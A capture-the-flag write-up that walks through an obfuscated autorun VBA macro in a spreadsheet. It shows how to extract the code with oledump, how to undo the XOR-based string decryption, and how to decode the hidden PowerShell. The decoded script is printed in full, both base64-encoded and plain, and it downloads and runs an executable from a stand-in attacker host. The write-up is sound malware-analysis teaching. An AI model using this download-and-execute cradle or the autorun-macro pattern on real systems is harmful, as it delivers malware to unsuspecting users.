# Writeup

The provided spreadsheet contains a macro - it is set to autostart but it doesn't actually work and the script is not malicious.
There is multiple ways to get to the VBA code:

* Open the spreadsheet (in a safe environment) and open the Visual Basic Editor with ALT+F11.
  * Here you will find two modules, `FetchMalware` and `SecretGen` which can be copy pasted to a code editor.
* Use a script such as `oledump.py` to extract the VBA code safely without opening a possibly malicious file
  * Run `oledump.py regnskab.xlsm` to inspect the streams and find the macros (streams with an "m" or "M")
  * Stream 5 and 6 contains the main macros `FetchMalware` and `SecretGen`, which can be decompressed and extracted with

```bash
oledump.py -s 5 -v regnskab.xlsm > FetchMalware.vba
oledump.py -s 6 -v regnskab.xlsm > SecretGen.vba
```

After this follows the analysis of the malware.
`SecretGen` is simplest, it just sets a public `key` variable with value `"cyb3r"`.
`FetchMalware` is the main module and clearly obfuscated in multiple ways - variable and function names are scrambled, seemingly useless declarations and loops have been inserted, all indentation is stripped, etc.

The easiest way to get a quick overview is to indent the file properly and separate each function and procedure.

We notice a subprocedure called `Document_Open`, indicating this autoruns, when the document is opened - this seems like a good starting point.
This procedure first calls `SecretGen.setKey` which we just saw sets the key to `"cyb3r"`.
The next part seems to initialize a variable to a seemingly random string, which is never used again - we can go through the document and find similar instances and just remove to reduce the clutter. The same goes for the next part: A loop which just calls `DoEvents` multiple times, again doing nothing - remove these as well.

Now the interesting part: a large array is initialized, and then the other function in the module is called with this as the input.
The output from that function is stored in a variable that is just passed to `Shell()`, so the output is some command - we often see a base64-encoded PowerShell script being run in such cases.
The array function first initializes a string variable, which we can also see is the one returned at the end.
The function then runs a loop from 0 to `UBound()` of the input array
If we rename the parameter to `arr`, the loop variable to `i`, and the output variable to `output`, then on each iteration the following is run:

```
output = output + Chr(arr(i) Xor Asc(Mid(key, (i Mod Len(key)) + 1, 1)) Xor i)
```

Every iteration, this adds another character to the output string. That character  is the current array element, XORed with the ASCII value of `Mid(key, (i Mod Len(key)) + 1, 1)` and `i`, the current index. `Mid` is just the substring function in VBA, so that part just cycles through the key characters. In Python, this line would be something like

```py
output += chr(arr[i] ^ ord(key[(i % len(key)) + 1]) ^ i)
```

So the loop just cycles through the array input and decrypts it Vigenére style with the `key`, and then also the current index. To get the output from this, there are two good options:
  1. Do a quick rewrite of the function in e.g. Python and input the array to see the output
  2. Open the macro in the spreadsheet and modify it to print the result. Just replace the `Shell` call and with e.g. `Debug.Print` or `MsgBox` to output the command argument passed to the shell. Then just run the macro to see the command.

The benefit of option 2 (a general approach) is that you don't need to understand anything of what the decryption function does - you can treat it as a black box. Another option that is sometimes useful is to literally run the malware in a VM with Wireshark open, checking what network calls are made (if any) - might be very dangerous though!

However you do it, you will see the output

```
powerSheLl -e JABmAGkAbABlACAAPQAgACIAbQBhAGwAdwBhAHIAZQAuAGUAeABlACIAOwAKACQAYQBkAGQAcgBlAHMAcwAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBzAGkAdABlAC4AaABrAG4ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGUAPwB0AG8AawBlAG4APQBEAEQAQwB7AGIAMwBfAGMANAByADMAZgB1ADEAXwB3AGgANAB0AF8AeQAwAHUAXwAwAHAAMwBuACEAfQAiAAoAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAGEAZABkAHIAZQBzAHMALAAgACQAZgBpAGwAZQApADsACgAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AJwB3AGkAbgAzADIAXwBQAHIAbwBjAGUAcwBzACcAKQAuAEMAcgBlAGEAdABlACgAJABmAGkAbABlACkAOwA=
```

This is passed to `Shell()`, and `powershell -e` is just a way to execute a base64 encoded script (which must first be utf-16-le encoded), so you can base64 decode it and then utf-16-le decode it to get the executed script:

```powershell
$file = "malware.exe";
$address = "http://malicious-site.hkn/malware.exe?token=DDC{b3_c4r3fu1_wh4t_y0u_0p3n!}"
(New-Object net.webclient).downloadFile($address, $file);
([wmiclass]'win32_Process').Create($file);
```

This code seemingly downloads a malicious .exe-file from the attacker's site and runs it - the flag is passed as a token query param.

So all in all, this obfuscated code just decrypts a PowerShell script and runs it.

## Flag

`DDC{b3_c4r3fu1_wh4t_y0u_0p3n!}`
